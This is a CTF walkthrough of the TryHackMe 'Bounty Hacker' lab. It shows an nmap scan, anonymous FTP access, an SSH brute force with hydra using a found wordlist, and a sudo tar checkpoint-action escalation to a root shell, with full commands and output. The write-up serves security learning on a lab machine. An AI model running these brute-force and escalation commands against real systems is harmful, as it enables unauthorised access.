---
title: THM Bounty Hacker Writup
categories:
  - TryHackMe
  - Writeup
tags:
  - THM
  - Try Hack Me
  - Walkthrough
  - Writeup
  - Bounty Hacker
---  

[Link to Room](https://tryhackme.com/room/cowboyhacker)  

Start off with an nmap scan:
`sudo nmap -A 10.10.144.76 -v`   
We got a hit for 3 ports:  
<!--end-->   
```
21/tcp    open   ftp             vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.14.1.118
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open   ssh             OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp    open   http            Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
```  
We see from an NSE script that Anonymous FTP login is allowed, which is a common misconfiguration and an easy way to gain information. Lets login to see whats there:
```
$ ftp 10.10.144.76
Connected to 10.10.144.76.
220 (vsFTPd 3.0.3)
Name (10.10.144.76:yosef): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

We list the directory:
```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07 21:41 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07 21:47 task.txt
226 Directory send OK.
```
We found two txt files, lets get them and see whats there.
locks.txt appears to be a wordlist, so well keep that for when we find a username.
Turns out, the task.txt file gives us a username `lin`, so lets try to bruteforce SSH with what we have. Well use hydra for this one.  
`hydra -l lin -P locks.txt ssh://10.10.144.76 -t 4`  
The -t 4 flag only runs 4 tasks at once, since many SSH configurations wont allow more.
After a little bit we get the login:
`[22][ssh] host: 10.10.144.76   login: lin   password: <CENSORED>`  
Great, now lets try to SSH in ourselves.
```
$ ssh lin@10.10.144.76
The authenticity of host '10.10.144.76 (10.10.144.76)' can't be established.
ECDSA key fingerprint is SHA256:fzjl1gnXyEZI9px29GF/tJr+u8o9i88XXfjggSbAgbE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.144.76' (ECDSA) to the list of known hosts.
lin@10.10.144.76's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$
```  
We're in. We can now get the user flag located in the users Desktop folder.  
  
First thing we should always run is `sudo -l` to check if the user can run anything as root (Or another user for that matter). It is the most common and easiest way to privesc.
we get:
```
$ sudo -l
[sudo] password for lin: 
  
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```  
We are allowed to run tar as root. tar is a file archiving binary; these are often very easy to exploit to get a root shell when we can run them as sudo or SUID/SGID.
We run:  
`sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`  
What this is doing is running tar to create an archive from the files `/dev/null` and `/dev/null`, which are the same thing - a null device; basically means you can write anything to there and it would act as if it was written when its actually just deleted. The `--checkpoint-action=exec=/bin/sh` is saying that its wants to execute `/bin/sh` (A shell) on each chekpoint (we technically only need the first).  
Running this automatically gives us a root shell as excpected:
```
$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami 
root
```  

